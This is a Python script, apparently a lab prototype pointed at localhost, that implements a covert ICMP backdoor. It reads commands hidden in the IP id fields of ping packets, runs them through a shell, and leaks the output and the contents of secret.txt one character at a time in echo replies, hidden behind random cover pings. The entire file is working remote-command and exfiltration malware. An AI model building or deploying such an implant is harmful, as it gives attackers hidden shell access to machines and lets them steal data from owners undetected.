import socket
import time
import os
import random
import subprocess
from multiprocessing import Process
import requests
from scapy.all import *
from scapy.layers.inet import ICMP, IP

destIP = 'localhost'
srcIP = 'localhost'
interface = '\\Device\\NPF_Loopback'

receivedResponse = False
awaitingData = False
command = ''

def sendICMPPing():
    address = destIP
    response = os.system("ping -c 1 " + address)

def processPacket(packet):
    global awaitingData

    if awaitingData:
        if packet[IP].id & 0x8000 == 0x8000:
            processCommand(packet)
    elif packet[ICMP].type == 8:
        if packet[IP].id == 65535:
            processSecret(packet)
        elif packet[IP].id == 65534:
            awaitingData = True

def processSecret(packet):
    with open('secret.txt') as f:
        string = f.readline()

    for char in [*string]:
        time.sleep(0.1)
        send(IP(dst=destIP, src=srcIP, id=ord(char)|0x8000) / ICMP(type=0))

def processCommand(packet):
    global command
    global awaitingData
    if packet[IP].id == 65533:
        awaitingData = False
        print(command)
        returnStatement = subprocess.check_output(command, shell=True).decode()
        for char in [*returnStatement]:
            time.sleep(0.1)
            send(IP(dst=destIP, src=srcIP, id=ord(char) | 0x8000) / ICMP(type=0))
        command = ''
    else:
        command = command + chr(packet[IP].id&0x7FFF)




def sniffForPacket():
    sniff(iface=interface, prn=processPacket, filter='icmp')



# functionList = [sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]

functionList = [sendICMPPing]


if __name__ == '__main__':
    p = Process(target=sniffForPacket)
    p.start()

    while True:
        waitTime = random.randint(1, 10)
        time.sleep(waitTime)
        random.choice(functionList)()